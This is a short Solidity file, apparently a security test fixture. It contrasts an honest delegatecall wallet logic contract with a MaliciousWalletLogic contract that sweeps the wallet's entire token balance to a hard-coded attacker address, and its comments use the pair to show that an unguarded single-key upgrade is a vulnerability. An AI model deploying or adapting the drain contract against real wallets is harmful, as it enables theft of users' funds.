// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice Minimal ERC-20 surface the logic modules operate on. The modules are reached
///         via `delegatecall` from a wallet, so inside them `address(this)` is the WALLET:
///         `balanceOf(address(this))` is the wallet's balance and a `transfer` moves the
///         wallet's own tokens. That is what makes an implementation swap equivalent to a
///         drain - the logic the wallet delegates to has full authority over its funds.
interface IERC20Minimal {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @title BenignWalletLogic - the honest implementation a wallet delegates to.
/// @notice Pays exactly the requested amount to the requested recipient. No surprises.
contract BenignWalletLogic {
    /// @dev Runs in the wallet's context (delegatecall): moves the WALLET's tokens.
    function execute(address token, address to, uint256 amount) external {
        IERC20Minimal(token).transfer(to, amount);
    }
}

/// @title MaliciousWalletLogic - the implementation an attacker swaps in once they hold
///        the single upgrade key.
/// @notice Ignores the intended recipient/amount and sweeps the wallet's FULL balance to a
///         hard-coded attacker address. Swapping this in IS the drain; no further trick is
///         needed. This is why an instant, single-key implementation swap with no timelock
///         or guardian is itself the vulnerability.
contract MaliciousWalletLogic {
    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    /// @dev Runs in the wallet's context (delegatecall): sweeps the WALLET's whole balance.
    function execute(address token, address, uint256) external {
        uint256 bal = IERC20Minimal(token).balanceOf(address(this));
        IERC20Minimal(token).transfer(attacker, bal);
    }
}
